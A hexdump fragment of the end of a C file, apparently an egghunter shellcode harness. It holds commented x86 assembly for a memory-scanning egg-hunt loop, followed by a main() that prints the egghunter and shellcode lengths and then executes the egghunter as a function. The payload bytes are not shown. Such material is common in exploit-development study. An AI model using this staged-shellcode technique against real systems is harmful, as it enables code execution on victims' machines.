00001220  66 6c 61 67 20 28 44 46  29 20 69 73 20 6e 6f 74  |flag (DF) is not|
00001230  20 73 65 74 0a 20 20 20  20 20 20 20 20 6a 6e 7a  | set.        jnz|
00001240  20 73 68 69 66 74 55 70  0a 20 20 20 20 20 20 20  | shiftUp.       |
00001250  20 6d 6f 76 20 65 62 78  2c 20 65 63 78 20 20 20  | mov ebx, ecx   |
00001260  20 20 20 20 20 3b 20 73  61 76 65 20 6f 66 66 20  |     ; save off |
00001270  65 63 78 20 69 6e 20 63  61 73 65 20 77 65 20 6e  |ecx in case we n|
00001280  65 65 64 20 74 6f 20 6b  65 65 70 20 6c 6f 6f 6b  |eed to keep look|
00001290  69 6e 67 0a 20 20 20 20  20 20 20 20 70 6f 70 20  |ing.        pop |
000012a0  65 63 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |ecx             |
000012b0  3b 20 72 65 73 74 6f 72  65 20 63 6f 75 6e 74 65  |; restore counte|
000012c0  72 0a 20 20 20 20 20 20  20 20 61 6e 64 20 61 6c  |r.        and al|
000012d0  2c 20 63 6c 20 20 20 20  20 20 20 20 20 20 3b 20  |, cl          ; |
000012e0  74 61 67 20 69 6e 20 65  61 78 0a 20 20 20 20 20  |tag in eax.     |
000012f0  20 20 20 73 63 61 73 64  0a 20 20 20 20 20 20 20  |   scasd.       |
00001300  20 70 75 73 68 20 65 63  78 0a 20 20 20 20 20 20  | push ecx.      |
00001310  20 20 6d 6f 76 20 65 63  78 2c 20 65 62 78 0a 20  |  mov ecx, ebx. |
00001320  20 20 20 20 20 20 20 6a  6e 7a 20 73 68 69 66 74  |       jnz shift|
00001330  55 70 0a 20 20 20 20 20  20 20 20 70 6f 70 20 65  |Up.        pop e|
00001340  63 78 0a 20 20 20 20 20  20 20 20 6c 6f 6f 70 20  |cx.        loop |
00001350  65 67 67 4c 6f 6f 70 0a  20 20 20 20 20 20 20 20  |eggLoop.        |
00001360  6a 6d 70 20 65 64 69 0a  2a 2f 0a 0a 76 6f 69 64  |jmp edi.*/..void|
00001370  20 6d 61 69 6e 28 29 20  7b 0a 20 20 20 20 70 72  | main() {.    pr|
00001380  69 6e 74 66 28 22 65 67  67 68 75 6e 74 65 72 20  |intf("egghunter |
00001390  6c 65 6e 67 74 68 3a 20  20 20 25 64 5c 6e 22 2c  |length:   %d\n",|
000013a0  20 73 69 7a 65 6f 66 28  65 67 67 68 75 6e 74 65  | sizeof(egghunte|
000013b0  72 29 2d 31 29 3b 0a 20  20 20 20 70 72 69 6e 74  |r)-1);.    print|
000013c0  66 28 22 73 68 65 6c 6c  63 6f 64 65 31 20 6c 65  |f("shellcode1 le|
000013d0  6e 67 74 68 3a 20 20 25  64 5c 6e 22 2c 20 73 69  |ngth:  %d\n", si|
000013e0  7a 65 6f 66 28 73 68 65  6c 6c 63 6f 64 65 31 29  |zeof(shellcode1)|
000013f0  2d 31 29 3b 0a 20 20 20  20 70 72 69 6e 74 66 28  |-1);.    printf(|
00001400  22 73 68 65 6c 6c 63 6f  64 65 32 20 6c 65 6e 67  |"shellcode2 leng|
00001410  74 68 3a 20 20 25 64 5c  6e 22 2c 20 73 69 7a 65  |th:  %d\n", size|
00001420  6f 66 28 73 68 65 6c 6c  63 6f 64 65 32 29 2d 31  |of(shellcode2)-1|
00001430  29 3b 0a 20 20 20 20 28  28 69 6e 74 28 2a 29 28  |);.    ((int(*)(|
00001440  29 29 65 67 67 68 75 6e  74 65 72 29 28 29 3b 0a  |))egghunter)();.|
00001450  7d                                                |}|
00001451
